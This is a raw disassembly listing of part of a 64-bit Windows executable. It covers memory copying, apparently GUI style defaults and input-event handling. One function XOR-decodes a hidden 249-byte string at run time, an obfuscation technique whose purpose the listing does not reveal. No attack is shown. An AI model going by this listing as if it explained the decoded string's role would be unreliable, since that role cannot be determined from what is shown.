   140002738:	48 8d 90 80 00 00 00 	lea    0x80(%rax),%rdx
   14000273f:	48 8d 89 80 00 00 00 	lea    0x80(%rcx),%rcx
   140002746:	0f 11 00             	movups %xmm0,(%rax)
   140002749:	0f 10 49 90          	movups -0x70(%rcx),%xmm1
   14000274d:	0f 11 48 10          	movups %xmm1,0x10(%rax)
   140002751:	0f 10 41 a0          	movups -0x60(%rcx),%xmm0
   140002755:	0f 11 40 20          	movups %xmm0,0x20(%rax)
   140002759:	0f 10 49 b0          	movups -0x50(%rcx),%xmm1
   14000275d:	0f 11 48 30          	movups %xmm1,0x30(%rax)
   140002761:	0f 10 41 c0          	movups -0x40(%rcx),%xmm0
   140002765:	0f 11 40 40          	movups %xmm0,0x40(%rax)
   140002769:	0f 10 49 d0          	movups -0x30(%rcx),%xmm1
   14000276d:	0f 11 48 50          	movups %xmm1,0x50(%rax)
   140002771:	0f 10 41 e0          	movups -0x20(%rcx),%xmm0
   140002775:	0f 11 40 60          	movups %xmm0,0x60(%rax)
   140002779:	0f 10 41 f0          	movups -0x10(%rcx),%xmm0
   14000277d:	0f 11 42 f0          	movups %xmm0,-0x10(%rdx)
   140002781:	0f 10 09             	movups (%rcx),%xmm1
   140002784:	0f 11 0a             	movups %xmm1,(%rdx)
   140002787:	0f 10 41 10          	movups 0x10(%rcx),%xmm0
   14000278b:	0f 11 42 10          	movups %xmm0,0x10(%rdx)
   14000278f:	0f 10 49 20          	movups 0x20(%rcx),%xmm1
   140002793:	0f 11 4a 20          	movups %xmm1,0x20(%rdx)
   140002797:	0f 10 41 30          	movups 0x30(%rcx),%xmm0
   14000279b:	0f 11 42 30          	movups %xmm0,0x30(%rdx)
   14000279f:	0f 10 49 40          	movups 0x40(%rcx),%xmm1
   1400027a3:	0f 11 4a 40          	movups %xmm1,0x40(%rdx)
   1400027a7:	0f 10 41 50          	movups 0x50(%rcx),%xmm0
   1400027ab:	0f 11 42 50          	movups %xmm0,0x50(%rdx)
   1400027af:	0f 10 49 60          	movups 0x60(%rcx),%xmm1
   1400027b3:	0f 11 4a 60          	movups %xmm1,0x60(%rdx)
   1400027b7:	48 8b 41 70          	mov    0x70(%rcx),%rax
   1400027bb:	48 89 42 70          	mov    %rax,0x70(%rdx)
   1400027bf:	0f b6 41 78          	movzbl 0x78(%rcx),%eax
   1400027c3:	49 8b c8             	mov    %r8,%rcx
   1400027c6:	88 42 78             	mov    %al,0x78(%rdx)
   1400027c9:	41 c6 80 f9 00 00 00 	movb   $0x0,0xf9(%r8)
   1400027d0:	00 
   1400027d1:	ff 15 59 ed 03 00    	call   *0x3ed59(%rip)        # 0x140041530
   1400027d7:	48 8b 54 24 48       	mov    0x48(%rsp),%rdx
   1400027dc:	c6 05 fd cf 04 00 01 	movb   $0x1,0x4cffd(%rip)        # 0x14004f7e0
   1400027e3:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400027e7:	76 48                	jbe    0x140002831
   1400027e9:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400027ee:	48 ff c2             	inc    %rdx
   1400027f1:	48 8b c1             	mov    %rcx,%rax
   1400027f4:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400027fb:	72 2f                	jb     0x14000282c
   1400027fd:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002801:	48 83 c2 27          	add    $0x27,%rdx
   140002805:	48 2b c1             	sub    %rcx,%rax
   140002808:	48 83 e8 08          	sub    $0x8,%rax
   14000280c:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002810:	76 1a                	jbe    0x14000282c
   140002812:	45 33 c9             	xor    %r9d,%r9d
   140002815:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000281c:	00 00 
   14000281e:	45 33 c0             	xor    %r8d,%r8d
   140002821:	33 d2                	xor    %edx,%edx
   140002823:	33 c9                	xor    %ecx,%ecx
   140002825:	ff 15 cd ec 03 00    	call   *0x3eccd(%rip)        # 0x1400414f8
   14000282b:	cc                   	int3
   14000282c:	e8 7f c1 03 00       	call   0x14003e9b0
   140002831:	48 8b c3             	mov    %rbx,%rax
   140002834:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140002839:	48 33 cc             	xor    %rsp,%rcx
   14000283c:	e8 cf be 03 00       	call   0x14003e710
   140002841:	48 83 c4 60          	add    $0x60,%rsp
   140002845:	5b                   	pop    %rbx
   140002846:	c3                   	ret
   140002847:	cc                   	int3
   140002848:	cc                   	int3
   140002849:	cc                   	int3
   14000284a:	cc                   	int3
   14000284b:	cc                   	int3
   14000284c:	cc                   	int3
   14000284d:	cc                   	int3
   14000284e:	cc                   	int3
   14000284f:	cc                   	int3
   140002850:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002855:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000285a:	55                   	push   %rbp
   14000285b:	48 8d 6c 24 a0       	lea    -0x60(%rsp),%rbp
   140002860:	48 81 ec 60 01 00 00 	sub    $0x160,%rsp
   140002867:	48 8b 05 d2 c7 04 00 	mov    0x4c7d2(%rip),%rax        # 0x14004f040
   14000286e:	48 33 c4             	xor    %rsp,%rax
   140002871:	48 89 45 50          	mov    %rax,0x50(%rbp)
   140002875:	48 8b f9             	mov    %rcx,%rdi
   140002878:	80 3d 51 cf 04 00 00 	cmpb   $0x0,0x4cf51(%rip)        # 0x14004f7d0
   14000287f:	0f 85 bb 02 00 00    	jne    0x140002b40
   140002885:	c7 44 24 30 08 27 6d 	movl   $0x5b6d2708,0x30(%rsp)
   14000288c:	5b 
   14000288d:	c7 44 24 34 d3 57 07 	movl   $0x600757d3,0x34(%rsp)
   140002894:	60 
   140002895:	c7 44 24 38 aa e5 64 	movl   $0xb264e5aa,0x38(%rsp)
   14000289c:	b2 
   14000289d:	c7 44 24 3c 82 cb 4e 	movl   $0xd04ecb82,0x3c(%rsp)
   1400028a4:	d0 
   1400028a5:	c7 44 24 40 73 a6 9c 	movl   $0xb69ca673,0x40(%rsp)
   1400028ac:	b6 
   1400028ad:	c7 44 24 44 54 c7 a8 	movl   $0x12a8c754,0x44(%rsp)
   1400028b4:	12 
   1400028b5:	c7 44 24 48 24 5e 86 	movl   $0x32865e24,0x48(%rsp)
   1400028bc:	32 
   1400028bd:	c7 44 24 4c 17 3a 7c 	movl   $0x497c3a17,0x4c(%rsp)
   1400028c4:	49 
   1400028c5:	c7 44 24 50 bb 5e 7b 	movl   $0x607b5ebb,0x50(%rsp)
   1400028cc:	60 
   1400028cd:	c7 44 24 54 a9 f3 27 	movl   $0x9a27f3a9,0x54(%rsp)
   1400028d4:	9a 
   1400028d5:	c7 44 24 58 b0 df 1d 	movl   $0xdd1ddfb0,0x58(%rsp)
   1400028dc:	dd 
   1400028dd:	c7 44 24 5c 6a ef c8 	movl   $0xfcc8ef6a,0x5c(%rsp)
   1400028e4:	fc 
   1400028e5:	c7 44 24 60 4f 87 b9 	movl   $0x17b9874f,0x60(%rsp)
   1400028ec:	17 
   1400028ed:	c7 44 24 64 77 2a bb 	movl   $0x32bb2a77,0x64(%rsp)
   1400028f4:	32 
   1400028f5:	c7 44 24 68 1e 36 75 	movl   $0x4f75361e,0x68(%rsp)
   1400028fc:	4f 
   1400028fd:	c7 44 24 6c fb 5f 12 	movl   $0x23125ffb,0x6c(%rsp)
   140002904:	23 
   140002905:	c7 44 24 70 9b e8 6c 	movl   $0x806ce89b,0x70(%rsp)
   14000290c:	80 
   14000290d:	c7 44 24 74 90 c5 48 	movl   $0xe048c590,0x74(%rsp)
   140002914:	e0 
   140002915:	c7 44 24 78 56 b9 ed 	movl   $0xb1edb956,0x78(%rsp)
   14000291c:	b1 
   14000291d:	c7 44 24 7c 08 87 d4 	movl   $0x1d48708,0x7c(%rsp)
   140002924:	01 
   140002925:	c7 45 80 3b 70 c6 76 	movl   $0x76c6703b,-0x80(%rbp)
   14000292c:	c7 45 84 58 51 7b 5e 	movl   $0x5e7b5158,-0x7c(%rbp)
   140002933:	c7 45 88 be 17 5d 63 	movl   $0x635d17be,-0x78(%rbp)
   14000293a:	c7 45 8c cd fe 22 9c 	movl   $0x9c22fecd,-0x74(%rbp)
   140002941:	c7 45 90 f5 c6 07 e6 	movl   $0xe607c6f5,-0x70(%rbp)
   140002948:	c7 45 94 54 a3 ea 82 	movl   $0x82eaa354,-0x6c(%rbp)
   14000294f:	c7 45 98 71 8e d0 14 	movl   $0x14d08e71,-0x68(%rbp)
   140002956:	c7 45 9c 39 21 b0 3d 	movl   $0x3db02139,-0x64(%rbp)
   14000295d:	c7 45 a0 1b 1c 7e 55 	movl   $0x557e1c1b,-0x60(%rbp)
   140002964:	c7 45 a4 aa 16 6c 68 	movl   $0x686c16aa,-0x5c(%rbp)
   14000296b:	c7 45 a8 e5 f7 64 b1 	movl   $0xb164f7e5,-0x58(%rbp)
   140002972:	c7 45 ac 9c cc 15 82 	movl   $0x8215cc9c,-0x54(%rbp)
   140002979:	c7 45 b0 b7 b2 ea dc 	movl   $0xdceab2b7,-0x50(%rbp)
   140002980:	c7 45 b4 49 84 f2 dd 	movl   $0xddf28449,-0x4c(%rbp)
   140002987:	c7 45 b8 11 4e f4 61 	movl   $0x61f44e11,-0x48(%rbp)
   14000298e:	c7 45 bc 57 01 94 4d 	movl   $0x4d940157,-0x44(%rbp)
   140002995:	c7 45 c0 ff 64 1c 34 	movl   $0x341c64ff,-0x40(%rbp)
   14000299c:	c7 45 c4 f8 12 2c bb 	movl   $0xbb2c12f8,-0x3c(%rbp)
   1400029a3:	c7 45 c8 ba d7 11 e1 	movl   $0xe111d7ba,-0x38(%rbp)
   1400029aa:	c7 45 cc db ba fe d3 	movl   $0xd3febadb,-0x34(%rbp)
   1400029b1:	c7 45 d0 21 a7 e9 c4 	movl   $0xc4e9a721,-0x30(%rbp)
   1400029b8:	c7 45 d4 17 4b 8a 26 	movl   $0x268a4b17,-0x2c(%rbp)
   1400029bf:	c7 45 d8 56 1b d7 03 	movl   $0x3d71b56,-0x28(%rbp)
   1400029c6:	c7 45 dc be 7c 2e 70 	movl   $0x702e7cbe,-0x24(%rbp)
   1400029cd:	c7 45 e0 d3 06 67 d9 	movl   $0xd96706d3,-0x20(%rbp)
   1400029d4:	c7 45 e4 84 f3 19 af 	movl   $0xaf19f384,-0x1c(%rbp)
   1400029db:	c7 45 e8 87 f6 c4 d3 	movl   $0xd3c4f687,-0x18(%rbp)
   1400029e2:	c7 45 ec 70 9c d5 f6 	movl   $0xf6d59c70,-0x14(%rbp)
   1400029e9:	c7 45 f0 48 33 e1 2f 	movl   $0x2fe13348,-0x10(%rbp)
   1400029f0:	c7 45 f4 0e 5b 8d 1d 	movl   $0x1d8d5b0e,-0xc(%rbp)
   1400029f7:	c7 45 f8 e2 3f 6c 31 	movl   $0x316c3fe2,-0x8(%rbp)
   1400029fe:	c7 45 fc 8b 0a 4e 83 	movl   $0x834e0a8b,-0x4(%rbp)
   140002a05:	c7 45 00 f1 d7 39 94 	movl   $0x9439d7f1,0x0(%rbp)
   140002a0c:	c7 45 04 a7 fb da f6 	movl   $0xf6dafba7,0x4(%rbp)
   140002a13:	c7 45 08 26 cb 87 b3 	movl   $0xb387cb26,0x8(%rbp)
   140002a1a:	c7 45 0c 0e 2c fe 00 	movl   $0xfe2c0e,0xc(%rbp)
   140002a21:	c7 45 10 23 56 cc 64 	movl   $0x64cc5623,0x10(%rbp)
   140002a28:	c7 45 14 d0 3e 66 49 	movl   $0x49663ed0,0x14(%rbp)
   140002a2f:	c7 45 18 cc 1c 77 85 	movl   $0x85771ccc,0x18(%rbp)
   140002a36:	c7 45 1c b6 e3 25 f5 	movl   $0xf525e3b6,0x1c(%rbp)
   140002a3d:	c7 45 20 a3 ca f8 dd 	movl   $0xddf8caa3,0x20(%rbp)
   140002a44:	c7 45 24 72 a9 98 e0 	movl   $0xe098a972,0x24(%rbp)
   140002a4b:	66 c7 45 28 11 00    	movw   $0x11,0x28(%rbp)
   140002a51:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002a54:	0f 11 45 30          	movups %xmm0,0x30(%rbp)
   140002a58:	33 d2                	xor    %edx,%edx
   140002a5a:	48 89 55 40          	mov    %rdx,0x40(%rbp)
   140002a5e:	41 b8 0f 00 00 00    	mov    $0xf,%r8d
   140002a64:	4c 89 45 48          	mov    %r8,0x48(%rbp)
   140002a68:	88 55 30             	mov    %dl,0x30(%rbp)
   140002a6b:	33 db                	xor    %ebx,%ebx
   140002a6d:	0f 1f 00             	nopl   (%rax)
   140002a70:	0f b6 cb             	movzbl %bl,%ecx
   140002a73:	80 e1 03             	and    $0x3,%cl
   140002a76:	c0 e1 03             	shl    $0x3,%cl
   140002a79:	41 b9 7b 64 62 8c    	mov    $0x8c62647b,%r9d
   140002a7f:	41 d3 e9             	shr    %cl,%r9d
   140002a82:	44 32 4c 1c 30       	xor    0x30(%rsp,%rbx,1),%r9b
   140002a87:	0f be c3             	movsbl %bl,%eax
   140002a8a:	6b c8 37             	imul   $0x37,%eax,%ecx
   140002a8d:	44 32 c9             	xor    %cl,%r9b
   140002a90:	49 3b d0             	cmp    %r8,%rdx
   140002a93:	73 20                	jae    0x140002ab5
   140002a95:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140002a99:	48 89 45 40          	mov    %rax,0x40(%rbp)
   140002a9d:	48 8d 45 30          	lea    0x30(%rbp),%rax
   140002aa1:	49 83 f8 0f          	cmp    $0xf,%r8
   140002aa5:	48 0f 47 45 30       	cmova  0x30(%rbp),%rax
   140002aaa:	44 88 0c 10          	mov    %r9b,(%rax,%rdx,1)
   140002aae:	c6 44 10 01 00       	movb   $0x0,0x1(%rax,%rdx,1)
   140002ab3:	eb 09                	jmp    0x140002abe
   140002ab5:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   140002ab9:	e8 b2 90 01 00       	call   0x14001bb70
   140002abe:	48 ff c3             	inc    %rbx
   140002ac1:	48 81 fb f9 00 00 00 	cmp    $0xf9,%rbx
   140002ac8:	73 0a                	jae    0x140002ad4
   140002aca:	4c 8b 45 48          	mov    0x48(%rbp),%r8
   140002ace:	48 8b 55 40          	mov    0x40(%rbp),%rdx
   140002ad2:	eb 9c                	jmp    0x140002a70
   140002ad4:	48 8d 4d 30          	lea    0x30(%rbp),%rcx
   140002ad8:	48 83 7d 48 0f       	cmpq   $0xf,0x48(%rbp)
   140002add:	48 0f 47 4d 30       	cmova  0x30(%rbp),%rcx
   140002ae2:	ff 15 48 ea 03 00    	call   *0x3ea48(%rip)        # 0x140041530
   140002ae8:	c6 05 e1 cc 04 00 01 	movb   $0x1,0x4cce1(%rip)        # 0x14004f7d0
   140002aef:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   140002af3:	48 83 fa 0f          	cmp    $0xf,%rdx
   140002af7:	76 47                	jbe    0x140002b40
   140002af9:	48 ff c2             	inc    %rdx
   140002afc:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140002b00:	48 8b c1             	mov    %rcx,%rax
   140002b03:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002b0a:	72 2f                	jb     0x140002b3b
   140002b0c:	48 83 c2 27          	add    $0x27,%rdx
   140002b10:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   140002b14:	48 2b c1             	sub    %rcx,%rax
   140002b17:	48 83 e8 08          	sub    $0x8,%rax
   140002b1b:	48 83 f8 1f          	cmp    $0x1f,%rax
   140002b1f:	76 1a                	jbe    0x140002b3b
   140002b21:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140002b28:	00 00 
   140002b2a:	45 33 c9             	xor    %r9d,%r9d
   140002b2d:	45 33 c0             	xor    %r8d,%r8d
   140002b30:	33 d2                	xor    %edx,%edx
   140002b32:	33 c9                	xor    %ecx,%ecx
   140002b34:	ff 15 be e9 03 00    	call   *0x3e9be(%rip)        # 0x1400414f8
   140002b3a:	cc                   	int3
   140002b3b:	e8 70 be 03 00       	call   0x14003e9b0
   140002b40:	48 8b c7             	mov    %rdi,%rax
   140002b43:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140002b47:	48 33 cc             	xor    %rsp,%rcx
   140002b4a:	e8 c1 bb 03 00       	call   0x14003e710
   140002b4f:	4c 8d 9c 24 60 01 00 	lea    0x160(%rsp),%r11
   140002b56:	00 
   140002b57:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140002b5b:	49 8b 7b 18          	mov    0x18(%r11),%rdi
   140002b5f:	49 8b e3             	mov    %r11,%rsp
   140002b62:	5d                   	pop    %rbp
   140002b63:	c3                   	ret
   140002b64:	cc                   	int3
   140002b65:	cc                   	int3
   140002b66:	cc                   	int3
   140002b67:	cc                   	int3
   140002b68:	cc                   	int3
   140002b69:	cc                   	int3
   140002b6a:	cc                   	int3
   140002b6b:	cc                   	int3
   140002b6c:	cc                   	int3
   140002b6d:	cc                   	int3
   140002b6e:	cc                   	int3
   140002b6f:	cc                   	int3
   140002b70:	48 ff 25 99 e8 03 00 	rex.W jmp *0x3e899(%rip)        # 0x140041410
   140002b77:	cc                   	int3
   140002b78:	cc                   	int3
   140002b79:	cc                   	int3
   140002b7a:	cc                   	int3
   140002b7b:	cc                   	int3
   140002b7c:	cc                   	int3
   140002b7d:	cc                   	int3
   140002b7e:	cc                   	int3
   140002b7f:	cc                   	int3
   140002b80:	48 ff 25 79 e8 03 00 	rex.W jmp *0x3e879(%rip)        # 0x140041400
   140002b87:	cc                   	int3
   140002b88:	cc                   	int3
   140002b89:	cc                   	int3
   140002b8a:	cc                   	int3
   140002b8b:	cc                   	int3
   140002b8c:	cc                   	int3
   140002b8d:	cc                   	int3
   140002b8e:	cc                   	int3
   140002b8f:	cc                   	int3
   140002b90:	40 53                	rex push %rbx
   140002b92:	48 83 ec 20          	sub    $0x20,%rsp
   140002b96:	48 8b d9             	mov    %rcx,%rbx
   140002b99:	48 8d 81 dc 00 00 00 	lea    0xdc(%rcx),%rax
   140002ba0:	b9 35 00 00 00       	mov    $0x35,%ecx
   140002ba5:	33 d2                	xor    %edx,%edx
   140002ba7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002bae:	00 00 
   140002bb0:	48 89 10             	mov    %rdx,(%rax)
   140002bb3:	48 89 50 08          	mov    %rdx,0x8(%rax)
   140002bb7:	48 8d 40 10          	lea    0x10(%rax),%rax
   140002bbb:	48 83 e9 01          	sub    $0x1,%rcx
   140002bbf:	75 ef                	jne    0x140002bb0
   140002bc1:	48 8b cb             	mov    %rbx,%rcx
   140002bc4:	c7 03 00 00 80 3f    	movl   $0x3f800000,(%rbx)
   140002bca:	c7 43 04 9a 99 19 3f 	movl   $0x3f19999a,0x4(%rbx)
   140002bd1:	c7 43 08 00 00 00 41 	movl   $0x41000000,0x8(%rbx)
   140002bd8:	48 c7 43 0c 00 00 00 	movq   $0x41000000,0xc(%rbx)
   140002bdf:	41 
   140002be0:	c7 43 14 00 00 80 3f 	movl   $0x3f800000,0x14(%rbx)
   140002be7:	c7 43 18 00 00 00 42 	movl   $0x42000000,0x18(%rbx)
   140002bee:	48 c7 43 1c 00 00 00 	movq   $0x42000000,0x1c(%rbx)
   140002bf5:	42 
   140002bf6:	48 c7 43 24 00 00 00 	movq   $0x3f000000,0x24(%rbx)
   140002bfd:	3f 
   140002bfe:	89 53 2c             	mov    %edx,0x2c(%rbx)
   140002c01:	48 c7 43 30 00 00 80 	movq   $0x3f800000,0x30(%rbx)
   140002c08:	3f 
   140002c09:	c7 43 38 00 00 80 3f 	movl   $0x3f800000,0x38(%rbx)
   140002c10:	c7 43 3c 00 00 80 40 	movl   $0x40800000,0x3c(%rbx)
   140002c17:	48 c7 43 40 00 00 40 	movq   $0x40400000,0x40(%rbx)
   140002c1e:	40 
   140002c1f:	89 53 48             	mov    %edx,0x48(%rbx)
   140002c22:	c7 43 4c 00 00 00 41 	movl   $0x41000000,0x4c(%rbx)
   140002c29:	c7 43 50 00 00 80 40 	movl   $0x40800000,0x50(%rbx)
   140002c30:	c7 43 54 00 00 80 40 	movl   $0x40800000,0x54(%rbx)
   140002c37:	c7 43 58 00 00 80 40 	movl   $0x40800000,0x58(%rbx)
   140002c3e:	c7 43 5c 00 00 80 40 	movl   $0x40800000,0x5c(%rbx)
   140002c45:	48 c7 43 60 00 00 00 	movq   $0x40000000,0x60(%rbx)
   140002c4c:	40 
   140002c4d:	89 53 68             	mov    %edx,0x68(%rbx)
   140002c50:	c7 43 6c 00 00 a8 41 	movl   $0x41a80000,0x6c(%rbx)
   140002c57:	c7 43 70 00 00 c0 40 	movl   $0x40c00000,0x70(%rbx)
   140002c5e:	c7 43 74 00 00 60 41 	movl   $0x41600000,0x74(%rbx)
   140002c65:	c7 43 78 00 00 10 41 	movl   $0x41100000,0x78(%rbx)
   140002c6c:	48 c7 43 7c 00 00 40 	movq   $0x41400000,0x7c(%rbx)
   140002c73:	41 
   140002c74:	c7 83 84 00 00 00 00 	movl   $0x40800000,0x84(%rbx)
   140002c7b:	00 80 40 
   140002c7e:	48 c7 83 88 00 00 00 	movq   $0x40800000,0x88(%rbx)
   140002c85:	00 00 80 40 
   140002c89:	89 93 90 00 00 00    	mov    %edx,0x90(%rbx)
   140002c8f:	c7 83 94 00 00 00 01 	movl   $0x1,0x94(%rbx)
   140002c96:	00 00 00 
   140002c99:	c7 83 98 00 00 00 00 	movl   $0x3f000000,0x98(%rbx)
   140002ca0:	00 00 3f 
   140002ca3:	48 c7 83 9c 00 00 00 	movq   $0x3f000000,0x9c(%rbx)
   140002caa:	00 00 00 3f 
   140002cae:	89 93 a4 00 00 00    	mov    %edx,0xa4(%rbx)
   140002cb4:	48 c7 83 a8 00 00 00 	movq   $0x40400000,0xa8(%rbx)
   140002cbb:	00 00 40 40 
   140002cbf:	c7 83 b0 00 00 00 00 	movl   $0x3f000000,0xb0(%rbx)
   140002cc6:	00 00 3f 
   140002cc9:	c7 83 b4 00 00 00 00 	movl   $0x41a00000,0xb4(%rbx)
   140002cd0:	00 a0 41 
   140002cd3:	c7 83 b8 00 00 00 00 	movl   $0x40400000,0xb8(%rbx)
   140002cda:	00 40 40 
   140002cdd:	c7 83 bc 00 00 00 00 	movl   $0x41980000,0xbc(%rbx)
   140002ce4:	00 98 41 
   140002ce7:	c7 83 c0 00 00 00 00 	movl   $0x41980000,0xc0(%rbx)
   140002cee:	00 98 41 
   140002cf1:	c7 83 c4 00 00 00 00 	movl   $0x40400000,0xc4(%rbx)
   140002cf8:	00 40 40 
   140002cfb:	c7 83 c8 00 00 00 00 	movl   $0x40400000,0xc8(%rbx)
   140002d02:	00 40 40 
   140002d05:	c7 83 cc 00 00 00 00 	movl   $0x3f800000,0xcc(%rbx)
   140002d0c:	00 80 3f 
   140002d0f:	66 c7 83 d0 00 00 00 	movw   $0x101,0xd0(%rbx)
   140002d16:	01 01 
   140002d18:	c6 83 d2 00 00 00 01 	movb   $0x1,0xd2(%rbx)
   140002d1f:	c7 83 d4 00 00 00 00 	movl   $0x3fa00000,0xd4(%rbx)
   140002d26:	00 a0 3f 
   140002d29:	c7 83 d8 00 00 00 9a 	movl   $0x3e99999a,0xd8(%rbx)
   140002d30:	99 99 3e 
   140002d33:	c7 83 2c 04 00 00 9a 	movl   $0x3e19999a,0x42c(%rbx)
   140002d3a:	99 19 3e 
   140002d3d:	c7 83 30 04 00 00 9a 	movl   $0x3e19999a,0x430(%rbx)
   140002d44:	99 19 3e 
   140002d47:	c7 83 34 04 00 00 cd 	movl   $0x3ecccccd,0x434(%rbx)
   140002d4e:	cc cc 3e 
   140002d51:	c7 83 38 04 00 00 00 	movl   $0x5000,0x438(%rbx)
   140002d58:	50 00 00 
   140002d5b:	c7 83 3c 04 00 00 00 	movl   $0x18000,0x43c(%rbx)
   140002d62:	80 01 00 
   140002d65:	e8 46 ff 01 00       	call   0x140022cb0
   140002d6a:	48 8b c3             	mov    %rbx,%rax
   140002d6d:	48 83 c4 20          	add    $0x20,%rsp
   140002d71:	5b                   	pop    %rbx
   140002d72:	c3                   	ret
   140002d73:	cc                   	int3
   140002d74:	cc                   	int3
   140002d75:	cc                   	int3
   140002d76:	cc                   	int3
   140002d77:	cc                   	int3
   140002d78:	cc                   	int3
   140002d79:	cc                   	int3
   140002d7a:	cc                   	int3
   140002d7b:	cc                   	int3
   140002d7c:	cc                   	int3
   140002d7d:	cc                   	int3
   140002d7e:	cc                   	int3
   140002d7f:	cc                   	int3
   140002d80:	85 d2                	test   %edx,%edx
   140002d82:	0f 84 84 01 00 00    	je     0x140002f0c
   140002d88:	56                   	push   %rsi
   140002d89:	48 83 ec 40          	sub    $0x40,%rsp
   140002d8d:	80 b9 a9 37 00 00 00 	cmpb   $0x0,0x37a9(%rcx)
   140002d94:	41 0f b6 f0          	movzbl %r8b,%esi
   140002d98:	44 8b d2             	mov    %edx,%r10d
   140002d9b:	0f 84 66 01 00 00    	je     0x140002f07
   140002da1:	4c 8b 99 f0 0d 00 00 	mov    0xdf0(%rcx),%r11
   140002da8:	48 89 5c 24 50       	mov    %rbx,0x50(%rsp)
   140002dad:	48 89 6c 24 58       	mov    %rbp,0x58(%rsp)
   140002db2:	8d aa 97 fd ff ff    	lea    -0x269(%rdx),%ebp
   140002db8:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140002dbd:	c6 81 aa 37 00 00 00 	movb   $0x0,0x37aa(%rcx)
   140002dc4:	83 fd 17             	cmp    $0x17,%ebp
   140002dc7:	77 07                	ja     0x140002dd0
   140002dc9:	c6 81 ab 37 00 00 00 	movb   $0x0,0x37ab(%rcx)
   140002dd0:	49 8d 9b 50 3e 00 00 	lea    0x3e50(%r11),%rbx
   140002dd7:	8b 3b                	mov    (%rbx),%edi
   140002dd9:	8d 47 ff             	lea    -0x1(%rdi),%eax
   140002ddc:	85 c0                	test   %eax,%eax
   140002dde:	78 2a                	js     0x140002e0a
   140002de0:	48 98                	cltq
   140002de2:	4c 6b c8 1c          	imul   $0x1c,%rax,%r9
   140002de6:	4d 03 8b 58 3e 00 00 	add    0x3e58(%r11),%r9
   140002ded:	0f 1f 00             	nopl   (%rax)
   140002df0:	41 83 39 04          	cmpl   $0x4,(%r9)
   140002df4:	75 0a                	jne    0x140002e00
   140002df6:	45 39 51 0c          	cmp    %r10d,0xc(%r9)
   140002dfa:	0f 84 97 00 00 00    	je     0x140002e97
   140002e00:	49 83 e9 1c          	sub    $0x1c,%r9
   140002e04:	48 83 e8 01          	sub    $0x1,%rax
   140002e08:	79 e6                	jns    0x140002df0
   140002e0a:	49 8b cb             	mov    %r11,%rcx
   140002e0d:	e8 1e cf 00 00       	call   0x14000fd30
   140002e12:	f3 0f 10 40 0c       	movss  0xc(%rax),%xmm0
   140002e17:	0f b6 00             	movzbl (%rax),%eax
   140002e1a:	40 3a c6             	cmp    %sil,%al
   140002e1d:	75 0b                	jne    0x140002e2a
   140002e1f:	0f 2e c3             	ucomiss %xmm3,%xmm0
   140002e22:	7a 06                	jp     0x140002e2a
   140002e24:	0f 84 ce 00 00 00    	je     0x140002ef8
   140002e2a:	4c 89 74 24 68       	mov    %r14,0x68(%rsp)
   140002e2f:	45 33 f6             	xor    %r14d,%r14d
   140002e32:	83 fd 17             	cmp    $0x17,%ebp
   140002e35:	f3 0f 11 5c 24 34    	movss  %xmm3,0x34(%rsp)
   140002e3b:	41 8b c6             	mov    %r14d,%eax
   140002e3e:	66 44 89 74 24 31    	mov    %r14w,0x31(%rsp)
   140002e44:	0f 96 c0             	setbe  %al
   140002e47:	44 88 74 24 33       	mov    %r14b,0x33(%rsp)
   140002e4c:	83 c0 02             	add    $0x2,%eax
   140002e4f:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140002e56:	00 
   140002e57:	89 44 24 24          	mov    %eax,0x24(%rsp)
   140002e5b:	41 8b 83 74 3e 00 00 	mov    0x3e74(%r11),%eax
   140002e62:	89 44 24 28          	mov    %eax,0x28(%rsp)
   140002e66:	ff c0                	inc    %eax
   140002e68:	41 89 83 74 3e 00 00 	mov    %eax,0x3e74(%r11)
   140002e6f:	44 8b 43 04          	mov    0x4(%rbx),%r8d
   140002e73:	44 89 54 24 2c       	mov    %r10d,0x2c(%rsp)
   140002e78:	40 88 74 24 30       	mov    %sil,0x30(%rsp)
   140002e7d:	41 3b f8             	cmp    %r8d,%edi
   140002e80:	75 4a                	jne    0x140002ecc
   140002e82:	8d 4f 01             	lea    0x1(%rdi),%ecx
   140002e85:	45 85 c0             	test   %r8d,%r8d
   140002e88:	74 2e                	je     0x140002eb8
   140002e8a:	41 8b c0             	mov    %r8d,%eax
   140002e8d:	99                   	cltd
   140002e8e:	2b c2                	sub    %edx,%eax
   140002e90:	d1 f8                	sar    $1,%eax
   140002e92:	41 03 c0             	add    %r8d,%eax
   140002e95:	eb 26                	jmp    0x140002ebd
   140002e97:	49 8b cb             	mov    %r11,%rcx
   140002e9a:	e8 91 ce 00 00       	call   0x14000fd30
   140002e9f:	4d 85 c9             	test   %r9,%r9
   140002ea2:	0f 84 6a ff ff ff    	je     0x140002e12
   140002ea8:	f3 41 0f 10 41 14    	movss  0x14(%r9),%xmm0
   140002eae:	41 0f b6 41 10       	movzbl 0x10(%r9),%eax
   140002eb3:	e9 62 ff ff ff       	jmp    0x140002e1a
   140002eb8:	b8 08 00 00 00       	mov    $0x8,%eax
   140002ebd:	3b c1                	cmp    %ecx,%eax
   140002ebf:	0f 4f c8             	cmovg  %eax,%ecx
   140002ec2:	8b d1                	mov    %ecx,%edx
   140002ec4:	48 8b cb             	mov    %rbx,%rcx
   140002ec7:	e8 54 8a 01 00       	call   0x14001b920
   140002ecc:	48 63 03             	movslq (%rbx),%rax
